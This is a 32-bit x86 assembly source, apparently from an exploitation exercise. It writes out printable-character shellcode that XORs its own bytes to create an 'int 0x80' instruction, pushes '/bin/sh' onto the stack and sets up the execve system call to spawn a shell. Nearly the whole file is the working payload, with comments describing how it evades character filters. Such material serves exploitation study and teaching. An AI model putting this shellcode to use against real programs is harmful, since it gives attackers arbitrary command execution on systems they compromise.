bits 32
%include "include/all.asm"
codelen equ inject-$

start_listing:
    push eax ; push the eip, which is incidentally stored in eax
    pop edx

    push '____'
    pop eax
    xor eax, '____'
    push eax

    push eax
    pop ecx

    ; construct a 0x80 for interrupt
    xor al, 0x7A ; Starting with highest ascii symbol (z)
    push eax ; Move eax to ecx to allow increment
    pop ecx
    inc ecx ; 0x7B
    inc ecx ; 0x7C
    inc ecx ; 0x7D
    inc ecx ; 0x7E
    inc ecx ; 0x7F
    inc ecx ; 0x80

    push ecx ; move 0x80 back to eax
    pop eax

    ; We have 0x80 in both eax and ecx

    xor al, 0x4D ; 0x4D = 'M' -- 0x4D XOR 0x80 = 0xCD

    ; We now have 0xCD and 0x80 in eax and ecx respectively
    ; We need to shift 0xCD to bit 8-15 to be able to push
    ; them together on the stack

    xor [edx+codelen], al
    xor [edx+codelen+1], cl

    ; Create 8 nul bytes on the stack
    push '____'
    pop eax
    xor eax, '____'

    push eax
    push eax

    ; use them to clear ecx and edx
    pop ecx
    pop edx


    ; Push \0 to the stack
    push '____'
    pop eax
    xor eax, '____'
    

    ; Push /bin/sh to the stack
    push '/sh0'

    ; moving esp to end of above string
    inc esp
    inc esp
    inc esp
    inc esp ; now right after '0'

    ; move additional 3 bytes to align '0' to be overwritten by pushing 4 bytes
    inc esp
    inc esp
    inc esp
    push eax ; clear '0' (and the following 3 bytes)

    ; move back stack pointer
    dec esp
    dec esp
    dec esp

    push '/bin'

    ; mov esp ebx
    push esp
    pop eax

    push eax
    push ecx
    push edx
    push eax
    push eax
    push ebp
    push esi
    push edi
    popad

    ;mov eax, SYS_execve
    push '____'
    pop eax
    xor eax,'____'
    ;xor al, `\t`
    ;xor al, SYS_execve
    xor al, 'O' ; O  = 01001111
    xor al, 'D' ; D  = 01000100
                ; al = 00001011

inject:
